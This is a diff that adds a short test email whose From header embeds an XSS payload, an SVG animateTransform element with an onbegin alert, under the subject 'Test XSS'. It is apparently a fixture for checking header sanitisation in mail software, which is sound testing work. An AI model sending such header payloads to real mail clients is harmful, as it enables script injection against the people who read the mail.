@@ -1,0 +1,7 @@
+From: <"testsvg><animateTransform attributeName=transform onbegin=alert(2)>@attack.com">
+To: gregorylang@paulhastings.com, iparker@freshfields.com, 
+Subject: Test XSS
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
